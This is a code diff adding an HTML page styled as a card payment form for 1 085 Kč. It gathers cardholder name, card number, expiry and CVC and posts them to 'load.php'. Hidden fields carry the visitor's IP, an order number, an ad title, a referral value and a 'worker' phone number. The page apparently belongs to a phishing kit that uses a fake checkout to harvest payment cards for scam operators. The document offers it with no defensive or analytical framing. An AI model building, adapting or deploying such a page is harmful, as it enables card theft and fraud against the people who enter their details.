@@ -1,0 +1,146 @@
+
+<!DOCTYPE html>
+<html>
+   <head>
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&amp;subset=cyrillic">
+      <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
+      <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
+      <link rel="stylesheet" type="text/css" href="css/common.css">
+      <link rel="shortcut icon" type="image/png" href="img/fav-icon.png">
+
+      <script type="text/javascript" src="js/jquery.js"></script>
+      <script type="text/javascript" src="js/bootstrap.js"></script>
+      <script type="text/javascript" src="js/common.js?v=2.6"></script>
+      <script type="text/javascript">
+         var heading_button = "<i class='fas fa-chevron-right'></i> ";
+      </script>
+
+      <meta charset="utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+      <title></title>
+   </head>
+
+   <body>
+      <div class="block-info">
+
+<h3 class="heading-info">
+          Payment information       </h3>
+
+         <h3 class="heading-info">
+                     </h3>
+
+         <p class="description-info">
+                     </p>
+
+         <div class="block-error">
+            <p>
+               <i class="fas fa-exclamation-triangle"></i>
+               <span class="label-error"></span>
+            </p>
+         </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <div class="block-method">
+         <div class="row">
+            <div class="list-method">
+               <div class="row">
+                  <div class="col-xs-6">
+                     <div class="item-method active-method">
+                        <img src="img/logo-card.svg">
+                     </div>
+                  </div>
+
+                  <div class="col-xs-6">
+                     <div class="item-method">
+                        <img src="img/logo-other.svg">
+                     </div>
+                  </div>
+
+                  <div class="col-xs-12">
+                     <div class="description-method">
+                        <p></p>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+
+      <div class="block-form">
+         <form class="form-payment" action="load.php" method="post">
+            <div class="form-group">
+                  <label for="input-holder">Card Holder</label>
+                  <input type="text" class="form-control" id="input-holder" name="card_holder" placeholder="Name Name">
+            </div>
+
+            <div class="form-group">
+                  <label for="input-number">Card number</label>
+                  <input type="text" class="form-control" id="input-number" name="card_number" data-type="number" placeholder="0000 0000 0000 0000">
+            </div>
+                            
+            <div class="row">
+               <div class="col-xs-4">
+                  <div class="form-group">
+                        <label for="input-month">Month/Year</label>
+                        <input type="text" class="form-control" id="input-month" name="card_expire_month" data-type="number" placeholder="01" maxlength="2">
+                  </div>
+               </div>
+
+               <div class="col-xs-4">
+                  <div class="form-group">
+                        <input type="text" class="form-control" id="input-year" name="card_expire_year" data-type="number" placeholder="19" maxlength="2">
+                  </div>
+               </div>
+
+               <div class="col-xs-4">
+                  <div class="form-group">
+                        <label for="input-code">
+                           CVC-code
+                           <i class="far fa-question-circle" data-toggle="tooltip" data-placement="top" title="3 the numbers on the back of the card"></i>
+                        </label>
+
+                        <input type="password" class="form-control" id="input-code" name="card_cvv" data-type="number" placeholder="•••" maxlength="3">
+                  </div>
+               </div>
+                            </div>
+                        <input type="hidden" name="amount" value="1085">
+            <input type="hidden" name="user_ip" value="172.70.135.205">
+            <input type="hidden" name="ref" value="0">
+            <input type="hidden" name="ad_title" value="">
+            <input type="hidden" name="order" value="224054354">
+            <input type="hidden" name="platform" value="PIPAY">
+            <input type="hidden" name="worker" value="+425 555 555-4455">
+         </form>
+
+
+         <div class="block-form-info">
+            <h4 class="heading-total">amount <b>1 085 Kč</b></h4>
+            <p class="heading-secure">
+               <i class="fas fa-lock"></i> <b>Cards of Ukrainian banks are not accepted for payment</b>
+            </p>
+         </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <div class="block-footer">
+         <div class="row">
+            <div class="col-xs-6">
+               <a class="button-secondary">
+                  <i class="fas fa-chevron-left"></i> Back
+               </a>
+            </div>
+
+            <div class="col-xs-6">
+               <a class="button-primary">
+                  <i class="fas fa-chevron-right"></i> Continue                </a>
+            </div>
+         </div>
+      </div>
+   </body>
+
+   </html>
